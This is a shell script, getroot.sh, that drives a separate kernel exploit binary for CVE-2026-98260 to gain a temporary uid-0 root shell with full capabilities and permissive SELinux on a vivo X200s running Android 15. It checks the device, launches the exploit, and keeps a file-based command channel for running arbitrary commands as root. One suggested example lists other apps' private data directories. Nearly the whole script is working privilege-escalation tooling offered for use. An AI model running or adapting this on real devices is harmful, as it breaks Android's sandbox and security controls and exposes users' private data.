#!/system/bin/sh
# =============================================================================
#  getroot.sh - CVE-2026-98260 temporary root for vivo X200s (6.6.127-android15)
#               NON-KernelSU build: no module is loaded, nothing is written to
#               any partition.  The session gives a live uid-0 process with
#               FULLCAP (0x1ffffffffff) and a kernel SELinux label (sid=1) on a
#               permissive system; it is gone after a reboot.
#
#  Requires: own121 (built from work/vivo/own121.c, pushed next to this file)
#
#  Usage:
#     sh getroot.sh check
#     sh getroot.sh start
#     sh getroot.sh cmd 'id'
#     sh getroot.sh cmdfile <path> [timeout]
#     sh getroot.sh shell      (interactive; needs a tty)
#     sh getroot.sh status
#     sh getroot.sh stop
#
#  Environment:
#     EXPLOIT=<path>   default /data/local/tmp/own121
#     TMO=<sec>        total wait cap for 'start' (default 90)
#     POLL=<sec>       poll interval while waiting for startup markers (5)
#     TCPOLL=<sec>     poll interval while waiting for a command rc (1)
#     FOLLOW=0         disable the live 'tail -f' echo
#     MARK_OK=<re>     success marker (grep -E), default [rootsh] setresuid=0
#     MARK_STOP=<re>   gate/scan stop marker (grep -E), default gate results
#     FORCE=1          allow a second attempt on the same boot (not advised)
#     GR_DATA_DIR=<p>  test hook: replace /data/local/tmp
#
#  NOTES / LIMITS (read these):
#   * One root session per boot.  The exploit's parent process must stay parked
#     because it owns the reclaimed page that now backs a live cred; it holds
#     /data/local/tmp/.lock2, so a second run bails out.  This script records
#     the boot_id of every attempt and refuses a second start on the same boot.
#     Reboot to clean up.
#   * 'stop' only ends the root shell; the exploit parent stays parked.
#     Reboot the device to remove everything.
#   * Run it within ~2-3 s of boot_completed: this device spawns/panics on its
#     own a few minutes after boot in the current state.  'check' warns when
#     the uptime is already high.
#   * The command channel is a REGULAR FILE plus
#     `tail -f -n 0 <chan> | own121 rootsh`, never a fifo: this shell domain
#     cannot mkfifo.
#   * Live echo: 'start' and 'cmd' run `tail -f` on the exploit log in the
#     foreground of this shell, so exploit/shell output appears here as it is
#     produced instead of being dumped afterwards.
#   * Every script step is timestamped and also written to
#     $STATE/session.log; the exploit keeps its own fsync'ed durable log at
#     /data/local/tmp/cve-2026-98260.log (survives a panic/reboot).
# =============================================================================
set -u

D=${GR_DATA_DIR:-/data/local/tmp}
EXPLOIT=${EXPLOIT:-$D/own121}
STATE=$D/.rootsh
CHAN=$STATE/chan
LOG=$STATE/rootd.log
PIDF=$STATE/pid
LAUNCHF=$STATE/launch
SHELLPIDF=$STATE/shellpid
BOOTF=$STATE/boot
SESSION_LOG=
TMO=${TMO:-90}
POLL=${POLL:-5}
TCPOLL=${TCPOLL:-1}
FOLLOW=${FOLLOW:-1}
FORCE=${FORCE:-0}

MARK_OK=${MARK_OK:-}
MARK_STOP=${MARK_STOP:-}
if [ -z "$MARK_OK" ]; then
	MARK_OK='\[rootsh\] setresuid\(0,0,0\)=0'
fi
if [ -z "$MARK_STOP" ]; then
	MARK_STOP='\[mod\] hooks_defend base=0x[0-9a-f]+|\[insmod\] init_module rc=0|KERNELSU LOADED'
fi
FAIL_RE='another instance holds the lock|base calibration failed|cred leak failed|child uid is not 0|setresuid failed; refusing|sh exec failed|second gate failed|refusing to plant|exhausted retries|fatal signal|parking \(reboot required\)|child report missing|plant1 .*; holding zombie'

RC_LAST=0

# ---------------------------------------------------------------------------
# logging
# ---------------------------------------------------------------------------
TS() { date +%H:%M:%S 2>/dev/null || printf '??:??:??'; }

say() {
	_say_m="[$(TS)] [getroot] $*"
	printf '%s\n' "$_say_m"
	[ -n "$SESSION_LOG" ] && printf '%s\n' "$_say_m" >> "$SESSION_LOG" 2>/dev/null
	return 0
}

step() {
	_say_m="[$(TS)] [getroot] == $* =="
	printf '%s\n' "$_say_m"
	[ -n "$SESSION_LOG" ] && printf '%s\n' "$_say_m" >> "$SESSION_LOG" 2>/dev/null
	return 0
}

warn() { printf '[%s] [getroot][WARN] %s\n' "$(TS)" "$*"; }
err()  { printf '[%s] [getroot][ERR] %s\n' "$(TS)" "$*"; }
die()  { err "$*"; exit 1; }

# ---------------------------------------------------------------------------
# small helpers
# ---------------------------------------------------------------------------
uptime_s() {
	_u=
	read -r _u _urest < /proc/uptime 2>/dev/null || return 1
	[ -n "$_u" ] || return 1
	printf '%s\n' "${_u%%.*}"
}

boot_id() { cat /proc/sys/kernel/random/boot_id 2>/dev/null; }

pid_alive() { # $1 = pid string
	# Do NOT use `kill -0` here: once the exploit works, the root shell and
	# the parked parent run as uid 0 while this script runs as uid 2000, so
	# kill -0 fails with EPERM and would report a live channel as dead.
	# `ps` is readable from the shell domain, so use it instead.
	case "${1:-}" in
	'' | *[!0-9]*) return 1 ;;
	esac
	ps -A -o PID,STAT 2>/dev/null |
		awk -v p="$1" 'NR > 1 && $1 == p && $2 !~ /Z/ { found = 1 } END { exit(found ? 0 : 1) }'
}

read_pid_file() {
	[ -f "$1" ] || return 1
	_pv=$(cat "$1" 2>/dev/null) || return 1
	[ -n "$_pv" ] || return 1
	printf '%s\n' "$_pv"
}

boot_matches() {
	_bs=$(cat "$BOOTF" 2>/dev/null) || return 1
	[ -n "$_bs" ] || return 1
	[ "$_bs" = "$(boot_id)" ]
}

parked_alive() {
	boot_matches || return 1
	_p=$(read_pid_file "$PIDF") || return 1
	pid_alive "$_p"
}

launch_alive() {
	boot_matches || return 1
	_p=$(read_pid_file "$LAUNCHF") || return 1
	pid_alive "$_p"
}

shell_alive() {
	boot_matches || return 1
	_p=$(read_pid_file "$SHELLPIDF") || return 1
	pid_alive "$_p"
}

channel_alive() {
	# Before the root shell pid is known (startup) the safest liveness proxy
	# is the launched pipeline.  After startup the shell pid is authoritative:
	# the 'tail -f' reader on the channel outlives the shell by design.
	if [ -f "$SHELLPIDF" ]; then
		shell_alive
		return $?
	fi
	launch_alive
}

shell_pid_from_log() {
	_sp=0
	while [ "$_sp" -lt 5 ]; do
		_s=$(sed -n 's/.*\[rootsh\] fake-cred holder parked pid=[0-9][0-9]* child=\([0-9][0-9]*\).*/\1/p' "$LOG" 2>/dev/null | tail -n 1)
		if [ -n "$_s" ] && [ "$_s" -gt 0 ] 2>/dev/null; then
			printf '%s\n' "$_s"
			return 0
		fi
		sleep 1
		_sp=$((_sp + 1))
	done
	return 1
}

ask_shell_pid() {
	# Ask the root shell to print its own pid.  This proves the shell is
	# actually reading the channel, and does not depend on any exploit log
	# line format.
	_at="sp$$"
	printf 'echo "[gr] shpid=$$ %s"\n' "$_at" >>"$CHAN" 2>/dev/null || return 1
	_ai=0
	while [ "$_ai" -lt 5 ]; do
		_al=$(grep -E "\[gr\] shpid=[0-9]+ ${_at}$" "$LOG" 2>/dev/null | tail -n 1)
		if [ -n "$_al" ]; then
			printf '%s\n' "$_al" | sed -n 's/.*\[gr\] shpid=\([0-9][0-9]*\) .*/\1/p'
			return 0
		fi
		sleep 1
		_ai=$((_ai + 1))
	done
	return 1
}

other_instances() {
	# any live own* exploit binary, excluding zombies
	ps -A -o PID,NAME,STAT 2>/dev/null |
		awk 'NR>1 && $2 ~ /^own[0-9]+/ && $3 !~ /Z/ { print }'
}

lock_busy() {
	# toybox flock only locks an fd: open the lock file as fd 9 for this
	# command and ask for a non-blocking exclusive lock.  rc=0 -> free.
	[ -f "$D/.lock2" ] || return 1
	[ -n "$(command -v flock 2>/dev/null)" ] || return 1
	if flock -n 9 9<"$D/.lock2" 2>/dev/null; then
		return 1
	fi
	return 0
}

tail_log() { # $1 = line count
	[ -f "$LOG" ] || return 0
	tail -n "${1:-8}" "$LOG" 2>/dev/null
}

last_match() { grep -E "$1" "$LOG" 2>/dev/null | tail -n 1; }

# ---------------------------------------------------------------------------
# live echo: tail -f the exploit log in the background,
# killed exactly by its own pid (no pipeline, so $! is the tail itself).
# ---------------------------------------------------------------------------
STREAM_PID=
stream_start() {
	[ "$FOLLOW" = "1" ] || return 0
	[ -f "$LOG" ] || return 0
	# Do NOT use `tail -f -n 0` here: toybox tail (Android 15) prints the
	# whole file in that combination, which would replay old exploit output.
	# Start at byte (current size + 1) instead, i.e. exactly at EOF.
	_sz=$(wc -c <"$LOG" 2>/dev/null)
	case "${_sz:-}" in
	'' | *[!0-9]*) return 0 ;;
	esac
	tail -c +$((_sz + 1)) -f "$LOG" 2>/dev/null &
	STREAM_PID=$!
	return 0
}

stream_stop() {
	[ -n "${STREAM_PID:-}" ] || return 0
	kill "$STREAM_PID" 2>/dev/null
	wait "$STREAM_PID" 2>/dev/null
	STREAM_PID=
	return 0
}

# ---------------------------------------------------------------------------
# pre-run environment check
# ---------------------------------------------------------------------------
PF_FAIL=0
PF_WARN=0
check_ok()   { say "  [ OK ] $*"; }
check_warn() { say "  [WARN] $*"; PF_WARN=$((PF_WARN + 1)); }
check_fail() { say "  [FAIL] $*"; PF_FAIL=$((PF_FAIL + 1)); }

preflight() {
	PF_FAIL=0
	PF_WARN=0
	step "pre-run environment check"

	say "  device: serial=$(getprop ro.serialno 2>/dev/null) model=$(getprop ro.product.model 2>/dev/null)"
	say "  kernel: $(uname -r)"
	say "  time:   $(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null)"

	_bc=$(getprop sys.boot_completed 2>/dev/null)
	if [ "$_bc" = "1" ]; then
		check_ok "sys.boot_completed=1"
	else
		check_fail "sys.boot_completed='${_bc:-<empty>}' - the boot has not finished; wait for 1 and retry"
	fi

	_up=$(uptime_s)
	if [ -z "$_up" ]; then
		check_fail "cannot read /proc/uptime"
	elif [ "$_up" -lt 1 ]; then
		check_fail "uptime ${_up}s is not sane"
	elif [ "$_up" -lt 40 ]; then
		check_ok "uptime ${_up}s (fresh-boot window, good)"
	elif [ "$_up" -lt 180 ]; then
		check_warn "uptime ${_up}s is late (preferred < 40s after boot); the exploit may miss"
	else
		check_warn "uptime ${_up}s is an old boot (preferred < 40s); reboot first or expect a failed run"
	fi

	if [ -d /sys/kernel/tracing/events ]; then
		check_ok "/sys/kernel/tracing/events present"
	else
		check_fail "/sys/kernel/tracing missing - the exploit cannot calibrate"
	fi

	if [ -f "$EXPLOIT" ] && [ -x "$EXPLOIT" ]; then
		check_ok "exploit executable: $EXPLOIT ($(wc -c <"$EXPLOIT" 2>/dev/null) bytes)"
	else
		check_fail "exploit missing or not executable: $EXPLOIT"
		say "         fix: adb push own121 $D/own121 && adb shell chmod 755 $D/own121"
	fi

	if [ -d "$D" ] && [ -w "$D" ]; then
		check_ok "$D is writable"
	else
		check_fail "$D is not writable - cannot create the channel/state files"
	fi

	_tmiss=
	for _t in setsid tail sleep date grep sed awk cat rm mkdir chmod wc head tr ps; do
		command -v "$_t" >/dev/null 2>&1 || _tmiss="$_tmiss $_t"
	done
	if [ -z "$_tmiss" ]; then
		check_ok "shell tools present (setsid/tail/sleep/date/grep/sed/awk/ps)"
	else
		check_fail "missing shell tools:$_tmiss - cannot run the live channel"
	fi

	_se=$(getenforce 2>/dev/null)
	case "$_se" in
	Enforcing | Permissive)
		check_ok "selinux=$_se (the exploit switches the global mode itself)"
		;;
	*)
		check_warn "selinux state '${_se:-?}' (expected Enforcing or Permissive)"
		;;
	esac

	_bi=$(boot_id)
	if [ -n "$_bi" ]; then
		say "  boot_id: $_bi"
	else
		check_warn "boot_id unreadable (/proc/sys/kernel/random/boot_id)"
	fi

	if channel_alive; then
		check_warn "a root channel already looks alive (launch pid $(read_pid_file "$LAUNCHF" 2>/dev/null))"
		if [ -s "$LOG" ]; then
			say "         last log line: $(tail -n 1 "$LOG" 2>/dev/null)"
		fi
	else
		if lock_busy; then
			check_fail "another exploit instance holds $D/.lock2 (parked parent) - reboot before a new run"
		else
			check_ok "$D/.lock2 is not held"
		fi
		_other=$(other_instances)
		if [ -n "$_other" ]; then
			check_fail "other exploit process(es) are running:"
			printf '%s\n' "$_other" | while IFS= read -r _ol; do say "         $_ol"; done
		else
			check_ok "no other exploit instance is running"
		fi
	fi

	if [ -f "$BOOTF" ]; then
		_bs=$(cat "$BOOTF" 2>/dev/null)
		if [ "$_bs" = "$_bi" ] && [ -n "$_bi" ]; then
			if channel_alive; then
				check_warn "this boot already has our root channel (that is the normal running state)"
			elif [ "$FORCE" = "1" ]; then
				check_warn "a root attempt was already made on this boot - FORCE=1, continuing anyway"
			else
				check_fail "a root attempt was already made on this boot (boot_id matches) - reboot before starting again"
			fi
		else
			say "  [info] session marker is from a previous boot (clean slate for this boot)"
		fi
	fi

	if [ -f "$CHAN" ]; then
		say "  [info] channel file: $CHAN ($(wc -c <"$CHAN" 2>/dev/null) bytes)"
	fi
	if [ -s "$LOG" ]; then
		say "  [info] last log line: $(tail -n 1 "$LOG" 2>/dev/null)"
	fi

	if [ "$PF_FAIL" -gt 0 ]; then
		err "environment is NOT ready: $PF_FAIL blocker(s), $PF_WARN warning(s)"
		err "fix the [FAIL] item(s) above; nothing was started"
		return 1
	fi
	say "environment ready ($PF_WARN warning(s))"
	return 0
}

# ---------------------------------------------------------------------------
# startup waits: poll every POLL seconds, stop early on markers / reboot
# ---------------------------------------------------------------------------
sync_pid() {
	_sp_i=0
	while [ "$_sp_i" -lt 15 ]; do
		_sp=$(sed -n 's/.*\[+\] pid=\([0-9][0-9]*\) .*/\1/p' "$LOG" 2>/dev/null | tail -n 1)
		if [ -n "$_sp" ]; then
			printf '%s\n' "$_sp" >"$PIDF"
			say "exploit pid=$_sp (from its own log line)"
			return 0
		fi
		if grep -Eq "$FAIL_RE" "$LOG" 2>/dev/null; then
			return 2
		fi
		if ! launch_alive; then
			return 3
		fi
		sleep 1
		_sp_i=$((_sp_i + 1))
	done
	return 1
}

wait_shell() {
	_w_t=0
	_w_boot=$(boot_id)
	_w_up=$(uptime_s)
	while :; do
		if grep -Eq "$MARK_OK" "$LOG" 2>/dev/null; then
			say "marker after ${_w_t}s: $(last_match "$MARK_OK")"
			return 0
		fi
		if grep -Eq "$MARK_STOP" "$LOG" 2>/dev/null; then
			say "gate/scan stop marker after ${_w_t}s: $(last_match "$MARK_STOP")"
			return 5
		fi
		if grep -Eq "$FAIL_RE" "$LOG" 2>/dev/null; then
			err "failure marker after ${_w_t}s: $(last_match "$FAIL_RE")"
			return 2
		fi
		if ! channel_alive && ! parked_alive; then
			err "exploit process is gone after ${_w_t}s"
			return 3
		fi

		_w_b=$(boot_id)
		if [ -n "$_w_b" ] && [ -n "$_w_boot" ] && [ "$_w_b" != "$_w_boot" ]; then
			err "device rebooted during startup (boot_id changed)"
			return 4
		fi
		_w_u=$(uptime_s)
		if [ -n "$_w_u" ] && [ -n "$_w_up" ] && [ "$_w_u" -lt $((_w_up - 2)) ]; then
			err "device rebooted during startup (uptime fell ${_w_up}s -> ${_w_u}s)"
			return 4
		fi

		if [ "$_w_t" -ge "$TMO" ]; then
			return 1
		fi
		_w_last=$(tail -n 1 "$LOG" 2>/dev/null)
		say "wait ${_w_t}s/${TMO}s: root shell not up yet (last: ${_w_last:-<no output>})"
		sleep "$POLL"
		_w_t=$((_w_t + POLL))
	done
}

# ---------------------------------------------------------------------------
# command channel
# ---------------------------------------------------------------------------
RN=0
run_cmd() { # $1 = command text, $2 = timeout seconds
	_rc_c=$1
	_rc_to=${2:-$TMO}
	RN=$((RN + 1))
	_t="c$$_$RN"

	if ! channel_alive; then
		err "no live root channel (launch pid gone)"
		return 125
	fi

	# One append, three lines.  The root shell executes them in order; the
	# friendly markers are printed by the shell itself and show up in the
	# live echo.  The rc marker carries a per-process tag so parallel
	# invocations cannot confuse each other.
	{
		printf 'echo "[gr] begin %s"\n' "$_t"
		printf '%s\n' "$_rc_c"
		printf 'printf "[gr] rc=%%s %s\\n" "$?"\n' "$_t"
	} >>"$CHAN" 2>/dev/null || {
		err "cannot append to $CHAN (channel file gone)"
		return 125
	}

	_r_t=0
	while :; do
		_rc_line=$(grep -E "\[gr\] rc=[-0-9]+ ${_t}$" "$LOG" 2>/dev/null | tail -n 1)
		if [ -n "$_rc_line" ]; then
			RC_LAST=$(printf '%s\n' "$_rc_line" | sed -n 's/.*\[gr\] rc=\([-0-9][0-9]*\) .*/\1/p')
			RC_LAST=${RC_LAST:-0}
			if [ "$FOLLOW" != "1" ]; then
				awk -v b="[gr] begin $_t" -v e="[gr] rc=" '
					index($0, b) { on = 1; next }
					index($0, e) { exit }
					on { print }
				' "$LOG"
			fi
			say "rc=$RC_LAST"
			return 0
		fi
		if ! channel_alive && ! parked_alive; then
			err "exploit process is gone while waiting for rc"
			return 124
		fi
		if [ "$_r_t" -ge "$_rc_to" ]; then
			err "timeout after ${_rc_to}s waiting for the command's rc"
			return 124
		fi
		if [ $((_r_t % 5)) -eq 0 ] && [ "$_r_t" -gt 0 ]; then
			say "still waiting for rc (${_r_t}s/${_rc_to}s)"
		fi
		sleep "$TCPOLL"
		_r_t=$((_r_t + TCPOLL))
	done
}

# ---------------------------------------------------------------------------
# actions
# ---------------------------------------------------------------------------
do_check() {
	preflight
	return $?
}

do_start() {
	step "start: CVE-2026-98260 temporary root"
	_bi=$(boot_id)
	if channel_alive && [ -n "$_bi" ]; then
		say "already RUNNING (launch pid $(read_pid_file "$LAUNCHF" 2>/dev/null)); use 'cmd', 'status' or 'stop'"
		return 0
	fi

	mkdir -p "$STATE" 2>/dev/null
	SESSION_LOG=$STATE/session.log
	: >"$SESSION_LOG" 2>/dev/null

	preflight || return 1

	if [ -z "$_bi" ]; then
		die "cannot read boot_id; refusing to start without reboot detection"
	fi

	step "launch exploit (one session per boot)"
	rm -f "$CHAN" "$LOG" "$PIDF" "$LAUNCHF" "$SHELLPIDF" "$STATE/fifo" 2>/dev/null
	: >"$CHAN" || die "cannot create channel file $CHAN"
	chmod 666 "$CHAN" 2>/dev/null
	: >"$LOG" || die "cannot create $LOG"
	: >"$SESSION_LOG" 2>/dev/null
	printf '%s\n' "$_bi" >"$BOOTF" 2>/dev/null || die "cannot record boot_id in $BOOTF"
	date +%s >"$STATE/started" 2>/dev/null

	say "  exploit:  $EXPLOIT rootsh"
	say "  channel:  $CHAN (regular file; no mkfifo on this device)"
	say "  pipeline: tail -f -n 0 '$CHAN' | '$EXPLOIT' rootsh"
	say "  log:      $LOG (durable copy: /data/local/tmp/cve-2026-98260.log)"
	say "  wait:     poll ${POLL}s, cap ${TMO}s, stop on markers or reboot"
	if [ "$FOLLOW" = "1" ]; then
		say "  live echo: ON - exploit output follows below as it arrives"
	else
		say "  live echo: OFF (FOLLOW=0)"
	fi

	stream_start
	trap 'stream_stop' 0
	setsid /system/bin/sh -c "tail -f -n 0 '$CHAN' | '$EXPLOIT' rootsh" >>"$LOG" 2>&1 </dev/null &
	_lp=$!
	printf '%s\n' "$_lp" >"$LAUNCHF"
	printf '%s\n' "$_lp" >"$PIDF"
	say "launched setsid pid=$_lp"

	sync_pid
	_src=$?
	if [ "$_src" -ne 0 ]; then
		case "$_src" in
		2) err "exploit failed before reporting its pid" ;;
		3) err "exploit pipeline died before reporting its pid" ;;
		*) err "no '[+] pid=' line after 15s - startup is stuck" ;;
		esac
		say "last log lines:"
		tail_log 15
		return 1
	fi

	step "wait for root shell marker (poll ${POLL}s, cap ${TMO}s)"
	wait_shell
	case $? in
	0) ;;
	2)
		err "the exploit reported a failure during startup"
		say "last log lines:"
		tail_log 15
		return 1
		;;
	3)
		err "the exploit process disappeared during startup"
		say "last log lines:"
		tail_log 15
		return 1
		;;
	4)
		err "device rebooted during startup - the session is gone; wait for boot and run 'start' again"
		return 1
		;;
	5)
		err "a gate/scan stop marker appeared, but this is not a root shell; not probing"
		say "last log lines:"
		tail_log 15
		return 1
		;;
	*)
		err "timeout after ${TMO}s waiting for the root shell"
		say "last log lines:"
		tail_log 15
		return 1
		;;
	esac

	_spid=$(ask_shell_pid)
	_how="channel pid echo"
	if [ -z "$_spid" ]; then
		warn "root shell did not answer the channel pid echo within 5s; checking the log for its pid"
		_spid=$(shell_pid_from_log)
		_how="'[rootsh] ... child=' log line"
	fi
	if [ -n "$_spid" ]; then
		printf '%s\n' "$_spid" >"$SHELLPIDF"
		say "root shell pid=$_spid (from the $_how)"
	else
		warn "cannot read the root shell pid; falling back to the launch pid for liveness"
		_cp=$(cat "$LAUNCHF" 2>/dev/null)
		[ -n "$_cp" ] && printf '%s\n' "$_cp" >"$SHELLPIDF"
	fi

	step "probe the root shell"
	run_cmd 'id; grep -E "^(Uid|CapEff|Seccomp):" /proc/self/status; echo -n "selinux="; getenforce' "$TMO"
	_prc=$?
	if [ "$_prc" -ne 0 ]; then
		err "probe failed (run_cmd rc=$_prc)"
		return 1
	fi
	if [ "$RC_LAST" != "0" ]; then
		warn "probe command returned rc=$RC_LAST (see output above)"
	fi
	_uid_line=$(grep -E '^Uid:[[:space:]]' "$LOG" 2>/dev/null | tail -n 1)
	if printf '%s\n' "${_uid_line:-}" | grep -Eq '^Uid:[[:space:]]+0[[:space:]]+0[[:space:]]+0[[:space:]]+0'; then
		say "  [ OK ] probe confirms uid 0 0 0 0"
	else
		warn "probe did not show 'Uid: 0 0 0 0' (last: ${_uid_line:-<none>}) - the channel may not be real root"
	fi

	# give tail a moment to flush the last lines before it is killed
	sleep 1
	stream_stop

	step "ready"
	say "root session is up this boot (uid 0, full caps, permissive SELinux)"
	say "  sh $0 cmd 'id; ls /data/data | head'"
	say "  sh $0 status"
	say "  sh $0 stop      (ends the shell; reboot to remove the parked parent)"
	return 0
}

do_cmd() {
	[ $# -ge 1 ] || die "usage: $0 cmd '<command>'"
	_cmd_to=${2:-$TMO}

	_bi=$(boot_id)
	if [ -f "$BOOTF" ] && [ -n "$_bi" ] && [ "$(cat "$BOOTF" 2>/dev/null)" != "$_bi" ]; then
		die "device rebooted since 'start' (boot_id changed); the old root session is gone - run 'start' again"
	fi
	if ! channel_alive; then
		if parked_alive || lock_busy; then
			err "the root shell is gone but a parked exploit still holds $D/.lock2"
			die "reboot the device to clean up before starting again"
		fi
		die "no root channel; run '$0 start' first"
	fi
	[ -f "$CHAN" ] || die "channel file missing: $CHAN (reboot and run 'start')"

	SESSION_LOG=$STATE/session.log
	step "cmd (timeout ${_cmd_to}s)"
	_first=$(printf '%s\n' "$1" | head -n 1)
	say "  command: $_first"
	stream_start
	trap 'stream_stop' 0
	run_cmd "$1" "$_cmd_to"
	_crc=$?
	sleep 1
	stream_stop
	if [ "$_crc" -ne 0 ]; then
		err "command channel failed (rc=$_crc)"
		return 1
	fi
	if [ "$RC_LAST" -eq 0 ]; then
		return 0
	fi
	return "$RC_LAST"
}

do_cmdfile() {
	[ $# -ge 1 ] || die "usage: $0 cmdfile <path>"
	[ -r "$1" ] || die "cannot read $1"
	_cf=$(tr -d '\r' <"$1" 2>/dev/null)
	[ -n "$_cf" ] || die "command file is empty: $1"
	do_cmd "$_cf" "${2:-$TMO}"
}

do_shell() {
	step "interactive root shell"
	if channel_alive; then
		err "a background root channel is already running (launch pid $(read_pid_file "$LAUNCHF" 2>/dev/null))."
		err "use 'cmd', or reboot before starting an interactive shell."
		return 1
	fi
	preflight || return 1

	mkdir -p "$STATE" 2>/dev/null
	_bi=$(boot_id)
	[ -n "$_bi" ] || die "cannot read boot_id"
	printf '%s\n' "$_bi" >"$BOOTF" 2>/dev/null
	date +%s >"$STATE/started" 2>/dev/null

	say "starting: $EXPLOIT rootsh (foreground, tty)"
	say "NOTE: one session per boot; after exit the exploit parent stays parked."
	say "      Reboot the device to remove the session completely."
	exec "$EXPLOIT" rootsh
}

do_status() {
	step "status"
	say "  kernel=$(uname -r) uptime=$(uptime_s)s selinux=$(getenforce 2>/dev/null || echo '?')"
	if [ -x "$EXPLOIT" ]; then
		say "  exploit=$EXPLOIT (executable)"
	else
		say "  exploit=$EXPLOIT (MISSING or not executable)"
	fi
	_bi=$(boot_id)
	_bs=$(cat "$BOOTF" 2>/dev/null)
	if [ -n "$_bs" ]; then
		if [ "$_bs" = "$_bi" ]; then
			say "  session marker: this boot (an attempt was already made)"
		else
			say "  session marker: previous boot (clean slate)"
		fi
	fi
	if shell_alive; then
		say "  channel: RUNNING (root shell pid=$(read_pid_file "$SHELLPIDF" 2>/dev/null))"
	elif parked_alive; then
		say "  channel: root shell GONE; exploit parent pid=$(read_pid_file "$PIDF" 2>/dev/null) still parked (reboot to clean)"
	elif launch_alive; then
		say "  channel: root shell status unknown (launch pid=$(read_pid_file "$LAUNCHF" 2>/dev/null))"
	elif lock_busy; then
		say "  channel: not ours; $D/.lock2 is held by another process"
	else
		say "  channel: not running"
	fi
	if [ -s "$LOG" ]; then
		say "  last 5 log lines ($LOG):"
		tail -n 5 "$LOG" 2>/dev/null | while IFS= read -r _ll; do say "    | $_ll"; done
	fi
}

do_stop() {
	step "stop"
	if ! channel_alive; then
		if parked_alive; then
			say "root shell already gone; exploit parent pid=$(read_pid_file "$PIDF" 2>/dev/null) still alive"
			# nudge the channel's tail -f reader: with no shell reading the
			# pipe, the next append makes it die of SIGPIPE and the parked
			# pipeline exits.
			[ -f "$CHAN" ] && printf '\n' >>"$CHAN" 2>/dev/null
			say "reboot the device to clean up completely"
		else
			say "not running"
		fi
		return 0
	fi
	[ -f "$CHAN" ] || die "channel file missing: $CHAN"
	printf 'exit\n' >>"$CHAN" 2>/dev/null || die "cannot write to $CHAN"
	say "sent 'exit' to the root shell"
	_i=0
	while [ "$_i" -lt 5 ] && shell_alive; do
		sleep 1
		_i=$((_i + 1))
	done
	if shell_alive; then
		warn "root shell did not exit within 5s (it may still be busy)"
	else
		say "root shell exited"
		# see above: one extra append lets the channel reader notice the
		# closed pipe and exit instead of lingering forever.
		[ -f "$CHAN" ] && printf '\n' >>"$CHAN" 2>/dev/null
		_i=0
		while [ "$_i" -lt 3 ] && launch_alive; do
			sleep 1
			_i=$((_i + 1))
		done
		if launch_alive; then
			say "channel reader is still parked (launch pid=$(read_pid_file "$LAUNCHF" 2>/dev/null)); harmless, reboot cleans it"
		else
			say "channel reader exited"
		fi
	fi
	say "the exploit parent stays parked by design (it holds the reclaimed page)."
	say "Reboot the device to remove the session completely."
	return 0
}

# ---------------------------------------------------------------------------
case "${1:-}" in
check) do_check ;;
start) do_start ;;
cmd) shift; do_cmd "$@" ;;
cmdfile) shift; do_cmdfile "$@" ;;
shell) do_shell ;;
status) do_status ;;
stop) do_stop ;;
*)
	cat <<EOF
getroot.sh - CVE-2026-98260 temporary root (no KernelSU)

  sh $0 check              pre-run environment check (exit 1 if not ready)
  sh $0 start              check, escalate, start the root command channel
  sh $0 cmd '<command>'    run a command as root (live output, then rc=N)
  sh $0 cmdfile <path>     run the command stored in <path> as root
  sh $0 shell              interactive root shell (foreground, needs tty)
  sh $0 status             channel state + last log lines
  sh $0 stop               end the root shell (reboot to fully clean)

  env: EXPLOIT=$EXPLOIT
       TMO=$TMO  POLL=$POLL  TCPOLL=$TCPOLL  FOLLOW=$FOLLOW
EOF
	;;
esac
